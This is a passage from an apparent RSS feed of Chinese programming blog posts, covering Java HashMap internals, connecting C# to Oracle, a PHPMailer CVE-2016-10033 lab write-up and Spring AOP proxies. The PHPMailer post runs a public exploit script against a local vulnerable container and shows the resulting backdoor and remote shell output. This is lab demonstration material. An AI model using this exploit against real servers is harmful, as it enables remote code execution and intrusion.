        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; es != &lt;span&gt;null&lt;/span&gt; ? es : (entrySet = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EntrySet());  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; EntrySet对应的集合  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; EntrySet继承于AbstractSet，说明该集合中没有重复的EntrySet。  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; EntrySet &lt;span&gt;extends&lt;/span&gt; AbstractSet&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Iterator&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; iterator() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; newEntryIterator();  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; contains(Object o) {  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(o &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; Map.Entry))  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;  
            Map.Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e = (Map.Entry&amp;lt;K,V&amp;gt;&lt;span&gt;) o;  
            Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; candidate =&lt;span&gt; getEntry(e.getKey());  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; candidate != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; candidate.equals(e);  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; remove(Object o) {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; removeMapping(o) != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; size;  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {  
            HashMap.&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.clear();  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; java.io.Serializable的写入函数  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将HashMap的“总的容量，实际容量，所有的Entry”都写入到输出流中  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; writeObject(java.io.ObjectOutputStream s)  
        &lt;/span&gt;&lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException  
    {  
        Iterator&lt;/span&gt;&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt; i =&lt;span&gt;  
            (size &lt;/span&gt;&amp;gt; 0) ? entrySet0().iterator() : &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out the threshold, loadfactor, and any hidden stuff  &lt;/span&gt;
&lt;span&gt;        s.defaultWriteObject();  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out number of buckets  &lt;/span&gt;
&lt;span&gt;        s.writeInt(table.length);  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out size (number of Mappings)  &lt;/span&gt;
&lt;span&gt;        s.writeInt(size);  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out keys and values (alternating)  &lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (i != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {  
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (i.hasNext()) {  
            Map.Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e =&lt;span&gt; i.next();  
            s.writeObject(e.getKey());  
            s.writeObject(e.getValue());  
            }  
        }  
    }  
 
 
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;long&lt;/span&gt; serialVersionUID = 362498820763181265L&lt;span&gt;;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; java.io.Serializable的读取函数：根据写入方式读出  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将HashMap的“总的容量，实际容量，所有的Entry”依次读出  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; readObject(java.io.ObjectInputStream s)  
         &lt;/span&gt;&lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException, ClassNotFoundException  
    {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read in the threshold, loadfactor, and any hidden stuff  &lt;/span&gt;
&lt;span&gt;        s.defaultReadObject();  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read in number of buckets and allocate the bucket array;  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; numBuckets =&lt;span&gt; s.readInt();  
        table &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[numBuckets];  
 
        init();  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Give subclass a chance to do its thing.  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read in size (number of Mappings)  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; size =&lt;span&gt; s.readInt();  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read the keys and values, and put the mappings in the HashMap  &lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i=0; i&amp;lt;size; i++&lt;span&gt;) {  
            K key &lt;/span&gt;=&lt;span&gt; (K) s.readObject();  
            V value &lt;/span&gt;=&lt;span&gt; (V) s.readObject();  
            putForCreate(key, value);  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回“HashMap总的容量”  &lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt;   capacity()     { &lt;span&gt;return&lt;/span&gt;&lt;span&gt; table.length; }  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回“HashMap的加载因子”  &lt;/span&gt;
    &lt;span&gt;float&lt;/span&gt; loadFactor()   { &lt;span&gt;return&lt;/span&gt;&lt;span&gt; loadFactor;   }  
} &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;参考资料：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;http://www.cnblogs.com/ITtangtang/p/3948406.html&lt;br/&gt;http://blog.csdn.net/ns_code/article/details/36034955&lt;br/&gt;http://www.cnblogs.com/xrq730/p/5030920.html&lt;br/&gt;http://blog.csdn.net/chenssy&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 23:31:00 +0000</pubDate>
<dc:creator>pony1223</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pony1223/p/7795882.html</dc:identifier>
</item>
<item>
<title>C#使用Oracle.ManagedDataAccess.dll - 上青天揽月</title>
<link>http://www.cnblogs.com/goldenbridge/p/7812081.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/goldenbridge/p/7812081.html</guid>
<description>&lt;p&gt;在刚接触C#的时候由于公司使用的就是Oracle数据库，那么C#怎么连接Oracle数据库就成了首要去掌握的知识点了。在那时没有ODP.NET，但visual studio却对Oralce数据库的调用进行了集成，就是下图中的这个，尽管现在使用这个的时候visual studio提醒过时的，但在那时却是非常好用的。&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109223310091-211359661.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;为什么现在visual studio中这个程序集依然能使用，有ODP.NET，单单要拿出Oracle.ManagedDataAccess.dll进行本文的重点呢？&lt;/p&gt;
&lt;p&gt;1、visual studio中提醒过时，因为微软和甲骨文存在数据库的竞争关系，并且从.NET的更新来看这个程序集没有再更新过，对于数据库一直在更新而调用的程序集一直不更新敢用下去么？还有一个我认为非常重要的原因就是使用这个程序集，摆脱不了每一个运行程序的客户机上都要去安装Oracle客户端的事实，试想一下，如果用户数量巨大的时候，安装客户端的工作量就相当的大，很耗费资源；&lt;/p&gt;
&lt;p&gt;2、甲骨文后来出了ODP.NET，各种资料以及官网上都说需要安装ODP.NET，然后引用Oracle.ManagedDataAccess.dll，他和visual studio中的程序集最大的区别在于会随着数据库更新，是oracle官方出的驱动；&lt;/p&gt;
&lt;p&gt;3、其实经过测试，ODP.NET的安装完全是没有必要的，直接在网上下载一个Oracle.ManagedDataAccess.dll，按如下方式引用即可，使用此种方式减少了ODP.NET的安装，无视操作系统的位数，最重要的是减少了Oracle客户端的安装；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109231924622-915943900.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109231810153-169408327.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109231952981-1542841377.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;那在哪里下载Oracle.ManagedDataAccess.dll呢？如果Oracle.ManagedDataAccess.dll有更新怎么知道呢？这个时候全宇宙最强大开发工具登场了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109225101731-1296716115.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109225112809-527969864.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109232438341-1311235825.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装完成就可以撸代码了，并且如果有更新可以随时能看到。并且在编程方面和以前使用System.Data.OracleClient程序集没有多大的不同，基本上拿以前使用System.Data.OracleClient程序集的代码做少许的改动即可。&lt;/p&gt;
&lt;p&gt;1、使用了连接字符串，而不是用oracle客户端的服务名了；&lt;/p&gt;
&lt;p&gt;2、几个命名空间的变化；&lt;/p&gt;
&lt;p&gt;下面是对数据库常用操作的封装&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections.Generic;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Linq;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Text;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Configuration;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Oracle.ManagedDataAccess.Client;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Data;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.IO;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Diagnostics;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Oracle.ManagedDataAccess.Types;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; OracleDemo
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; OracleHelper
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; connStr = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;User Id=admin;Password=123;Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.0.1)(PORT=1521)))(CONNECT_DATA=(SERVICE_NAME=test)))&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; 执行SQL语句,返回受影响行数
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; ExecuteNonQuery(&lt;span&gt;string&lt;/span&gt; sql, &lt;span&gt;params&lt;/span&gt;&lt;span&gt; OracleParameter[] parameters)
        {
            &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (OracleConnection conn = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; OracleConnection(connStr))
            {
                conn.Open();
                &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (OracleCommand cmd =&lt;span&gt; conn.CreateCommand())
                {
                    cmd.CommandText &lt;/span&gt;=&lt;span&gt; sql;
                    cmd.Parameters.AddRange(parameters);
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; cmd.ExecuteNonQuery();
                }
            }
        }
        &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;
        &lt;span&gt;#region&lt;/span&gt; 执行SQL语句,返回DataTable;只用来执行查询结果比较少的情况
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DataTable ExecuteDataTable(&lt;span&gt;string&lt;/span&gt; sql, &lt;span&gt;params&lt;/span&gt;&lt;span&gt; OracleParameter[] parameters)
        {
            &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (OracleConnection conn = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; OracleConnection(connStr))
            {
                conn.Open();
                &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (OracleCommand cmd =&lt;span&gt; conn.CreateCommand())
                {
                    cmd.CommandText &lt;/span&gt;=&lt;span&gt; sql;
                    cmd.Parameters.AddRange(parameters);
                    OracleDataAdapter adapter &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; OracleDataAdapter(cmd);
                    DataTable datatable &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DataTable();
                    adapter.Fill(datatable);
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; datatable;
                }
            }
        }
        &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;&lt;span&gt;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下代码是调用部分&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
                &lt;span&gt;string&lt;/span&gt; sqlString = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Select a.col1,a.col2 From test a Where a.id=:id&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
                DataTable dt &lt;/span&gt;= OracleHelper.ExecuteDataTable(sqlString,&lt;span&gt;new&lt;/span&gt; OracleParameter(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:id&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;1&lt;/span&gt;));
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;程序编写完成，生成完成后，目录大概如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1271598/201711/1271598-20171109233111294-416721540.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这时候拷贝Debug文件夹到目标客户电脑上即可直接运行了（前提是目标客户电脑上有.NET Framework），完全摆脱安装Oracle客户端。&lt;/p&gt;

</description>
<pubDate>Thu, 09 Nov 2017 15:52:00 +0000</pubDate>
<dc:creator>上青天揽月</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/goldenbridge/p/7812081.html</dc:identifier>
</item>
<item>
<title>PHPMailer &lt; 5.2.18 远程代码执行漏洞（CVE-2016-10033） - starnight_cyber</title>
<link>http://www.cnblogs.com/Hi-blog/p/7812008.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Hi-blog/p/7812008.html</guid>
<description>&lt;h3&gt;PHPMailer &amp;lt; 5.2.18 Remote Code Execution　&lt;/h3&gt;
&lt;p&gt;　　本文将简单展示一下PHPMailer远程代码执行漏洞(CVE-2016-10033)的利用过程，使用的是别人已经搭建好的docker环境，见参考链接。&lt;/p&gt;
&lt;p&gt;　　实验环境是在Ubuntu 16.04.3上，使用docker镜像。&lt;/p&gt;
&lt;h3&gt;安装和使用docker镜像&lt;/h3&gt;
&lt;p&gt;　　首先需要在ubuntu上安装docker，可使用如下命令进行安装：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
root@starnight:~# &lt;strong&gt;apt-&lt;span&gt;get&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt; install docker.io&lt;/strong&gt;　　　　【安装docker】
root@starnight:&lt;/span&gt;~# &lt;strong&gt;docker run --rm -it -p &lt;span&gt;8080&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt; vulnerables/cve-&lt;span&gt;2016&lt;/span&gt;-&lt;span&gt;10033&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
AH00558: apache2: Could not reliably determine the server&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;s fully qualified domain name, using 172.17.0.2. Set the &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;ServerName&lt;span&gt;'&lt;/span&gt;&lt;span&gt; directive globally to suppress this message&lt;/span&gt;
==&amp;gt; /&lt;span&gt;var&lt;/span&gt;/log/apache2/access.log &amp;lt;==

==&amp;gt; /&lt;span&gt;var&lt;/span&gt;/log/apache2/error.log &amp;lt;==&lt;span&gt;
[Thu Nov &lt;/span&gt;&lt;span&gt;09&lt;/span&gt; &lt;span&gt;15&lt;/span&gt;:&lt;span&gt;11&lt;/span&gt;:&lt;span&gt;47.098917&lt;/span&gt; &lt;span&gt;2017&lt;/span&gt;] [mpm_prefork:notice] [pid &lt;span&gt;8&lt;/span&gt;] AH00163: Apache/&lt;span&gt;2.4&lt;/span&gt;.&lt;span&gt;10&lt;/span&gt; (Debian) configured --&lt;span&gt; resuming normal operations
[Thu Nov &lt;/span&gt;&lt;span&gt;09&lt;/span&gt; &lt;span&gt;15&lt;/span&gt;:&lt;span&gt;11&lt;/span&gt;:&lt;span&gt;47.101902&lt;/span&gt; &lt;span&gt;2017&lt;/span&gt;] [core:notice] [pid &lt;span&gt;8&lt;/span&gt;] AH00094: Command line: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;/usr/sbin/apache2 -f /etc/apache2/apache2.conf&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;

==&amp;gt; /&lt;span&gt;var&lt;/span&gt;/log/apache2/other_vhosts_access.log &amp;lt;==
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　安装完docker之后，需要把相应的靶机环境下载(pull)下来，首次运行上面那条命令会下载docker镜像，之后就会像上面运行的那样，表明docker镜像正在运行。&lt;/p&gt;
&lt;p&gt;　　查看一下ip地址:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
root@starnight:~# &lt;span&gt;ifconfig&lt;/span&gt; | &lt;span&gt;grep&lt;/span&gt;&lt;span&gt; inet
          inet addr:&lt;/span&gt;&lt;strong&gt;&lt;span&gt;172.17&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;&lt;/strong&gt;  Bcast:&lt;span&gt;0.0&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt;  Mask:&lt;span&gt;255.255&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt;&lt;span&gt;
          inet6 addr: fe80::&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;:4aff:fe88:49e5/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; Scope:Link
          inet addr:&lt;/span&gt;&lt;strong&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.8&lt;/span&gt;&lt;/strong&gt;  Bcast:&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.255&lt;/span&gt;  Mask:&lt;span&gt;255.255&lt;/span&gt;.&lt;span&gt;255.0&lt;/span&gt;&lt;span&gt;
          inet6 addr: fe80::a7c0:e1f7:&lt;/span&gt;&lt;span&gt;2118&lt;/span&gt;:7e6a/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; Scope:Link
          inet addr:&lt;/span&gt;&lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;  Mask:&lt;span&gt;255.0&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt;&lt;span&gt;
          inet6 addr: ::&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;/&lt;span&gt;128&lt;/span&gt;&lt;span&gt; Scope:Host
          inet6 addr: fe80::98a9:5bff:fe1f:b1c9&lt;/span&gt;/&lt;span&gt;64&lt;/span&gt; Scope:Link
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这里192.168.0.8是我们Ubuntu的ip地址，172.17.0.1是docker镜像的内部地址，通过访问http://192.168.0.8:8080/， 就能看到搭建好的存在漏洞的环境：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/624934/201711/624934-20171109231832981-614367471.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;漏洞测试&lt;/h3&gt;
&lt;p&gt;　　接下来我们使用kali来进行测试， 下载&lt;a href=&quot;https://github.com/opsxcq/exploit-CVE-2016-10033&quot; target=&quot;_blank&quot;&gt;exploit-CVE-2016-10033&lt;/a&gt;中的&lt;a id=&quot;a80a34800862b56cf70a8bc707a5296b-e6e42a687e84f4f40eb8d77f2cd817abd8ab8356&quot; class=&quot;js-navigation-open&quot; title=&quot;exploit.sh&quot; href=&quot;https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/exploit.sh&quot;&gt;exploit.sh&lt;/a&gt;到本地，运行如下命令进行测试：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
root@kali:~/penetest/CVE-&lt;span&gt;2016&lt;/span&gt;-&lt;span&gt;10033&lt;/span&gt;# &lt;strong&gt;./exploit.&lt;span&gt;sh&lt;/span&gt; &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.8&lt;/span&gt;:&lt;span&gt;8080&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
[&lt;/span&gt;+] CVE-&lt;span&gt;2016&lt;/span&gt;-&lt;span&gt;10033&lt;/span&gt;&lt;span&gt; exploit by opsxcq
[&lt;/span&gt;+] Exploiting &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.8&lt;/span&gt;:&lt;span&gt;8080&lt;/span&gt;&lt;span&gt;
[&lt;/span&gt;+] Target exploited, acessing shell at http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;192.168.0.8:8080/backdoor.php&lt;/span&gt;
[+] Checking &lt;span&gt;if&lt;/span&gt;&lt;span&gt; the backdoor was created on target system
[&lt;/span&gt;+&lt;span&gt;] Backdoor.php found on remote system
[&lt;/span&gt;+] Running &lt;span&gt;whoami&lt;/span&gt;&lt;span&gt;
www&lt;/span&gt;-&lt;span&gt;data
RemoteShell&lt;/span&gt;&amp;gt; &lt;strong&gt;&lt;span&gt;ls&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
[&lt;/span&gt;+] Running &lt;span&gt;ls&lt;/span&gt;&lt;span&gt;&lt;strong&gt;
vulnerable&lt;/strong&gt;
RemoteShell&lt;/span&gt;&amp;gt; &lt;span&gt;pwd&lt;/span&gt;&lt;span&gt;
[&lt;/span&gt;+] Running &lt;strong&gt;&lt;span&gt;pwd&lt;/span&gt;&lt;/strong&gt;
&lt;strong&gt;/www&lt;/strong&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　其实，并不是所有的命令运行都有回显，比如说查看ip地址的命令ifconfig就看不到输出。更多详情，请参考下面的链接。&lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;p&gt;　　&lt;a href=&quot;https://github.com/opsxcq/exploit-CVE-2016-10033&quot; target=&quot;_blank&quot;&gt;opsxcq/exploit-CVE-2016-10033&lt;/a&gt;　　&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 15:27:00 +0000</pubDate>
<dc:creator>starnight_cyber</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Hi-blog/p/7812008.html</dc:identifier>
</item>
<item>
<title>Spring AOP高级——源码实现（1）动态代理技术 - 余林丰</title>
<link>http://www.cnblogs.com/yulinfeng/p/7811965.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yulinfeng/p/7811965.html</guid>
<description>&lt;p&gt;　　在正式进入Spring AOP的源码实现前，我们需要准备一定的基础也就是面向切面编程的核心——动态代理。 动态代理实际上也是一种结构型的设计模式，JDK中已经为我们准备好了这种设计模式，不过这种JDK为我们提供的动态代理有2个缺点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;只能代理实现了接口的目标对象；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基于反射，效率低&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;　　鉴于以上2个缺点，于是就出现了第二种动态代理技术——CGLIB（Code Generation Library）。这种代理技术一是不需要目标对象实现接口（这大大扩展了使用范围），二是它是基于字节码实现（这比反射效率高）。当然它并不是完全没有缺点，&lt;strong&gt;因为它不能代理final方法&lt;/strong&gt;（因为它的动态代理实际是生成目标对象的子类）。&lt;/p&gt;
&lt;p&gt;　　Spring AOP中生成代理对象时既可以使用JDK的动态代理技术，也可以使用CGLIB的动态代理技术，本章首先对这两者动态代理技术做简要了解，便于后续源码的理解。&lt;/p&gt;

&lt;p&gt;　　JDK动态代理技术首先要求我们目标对象需要实现一个接口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; 
&lt;span&gt;3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/8.
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; Subject {
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;     &lt;span&gt;void&lt;/span&gt;&lt;span&gt; sayHello();
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　接下来就是我们需要代理的真实对象，即目标对象：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt; * 目标对象，即需要被代理的对象
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/8.
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; RealSubject &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Subject{
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; sayHello() {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         System.out.println(&quot;hello world&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
